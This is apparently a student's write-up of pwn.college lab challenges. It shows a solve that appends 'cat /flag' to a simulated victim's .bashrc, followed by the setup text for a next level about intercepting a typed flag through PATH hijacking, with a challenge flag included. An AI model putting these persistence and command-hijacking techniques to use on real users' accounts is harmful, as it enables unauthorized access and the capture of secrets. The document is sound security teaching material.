# Silly Shenanigans

## Bashrc backdoor
When your shell starts up, it looks for .bashrc file in your home directory and executes it as a startup script. You can customize your /home/hacker/.bashrc with useful things, such as setting environment variables, tweaking your shell configuration, and so on.

You can also use it for evil! An unwitting victim's .bashrc is a common target for shenanigans. Imagine sneaking onto your friend's computer and adding a echo "Hackers were here!" at the end of their .bashrc. That's funny, but the same capability can be used for much more nefarious purposes. Malicious software, for example, often targets startup scripts such as .bashrc to maintain persistence into the future!

In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named zardus, with a home directory of /home/zardus. You, as the hacker user, have write access to his .bashrc, and zardus has read-access to /flag. The victim is simulated by the script /challenge/victim, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?

### Solve
**Flag:** `pwn.college{ohRZeGRzp0I7t-4YdjySZB3sG8G.0VMzEzNxwCN2gjNzEzW}`

I added the command to read the flag in the .bashrc script and executed it.
```
hacker@shenanigans~bashrc-backdoor:~$ echo 'cat /flag' > /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{ohRZeGRzp0I7t-4YdjySZB3sG8G.0VMzEzNxwCN2gjNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```

### New Learnings
I learnt about .bashrc being a startup script and how you can use it.

### References

## Sniffing input
In the previous level, you abused Zardus's ~/.bashrc to make him run commands for you.

This time, Zardus doesn't keep the flag lying around in a readable file after he logs in. Instead he'll run a command named flag_checker, manually typing the flag into it for verification.

Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?

